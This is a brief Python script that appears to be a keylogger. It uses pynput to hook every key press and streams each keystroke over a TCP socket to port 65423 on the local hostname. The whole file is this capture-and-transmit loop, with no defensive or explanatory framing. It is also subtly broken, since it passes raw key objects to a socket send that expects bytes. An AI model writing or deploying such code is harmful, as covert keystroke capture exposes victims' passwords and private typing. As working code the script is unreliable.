from pynput.keyboard import *
import socket

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((socket.gethostname(),65423))

def pressedkey(key):
	keydata = key
	s.send(keydata)
	data = s.recv(8)
with Listener(on_press = pressedkey) as listener:
	listener.join()	
s.close()
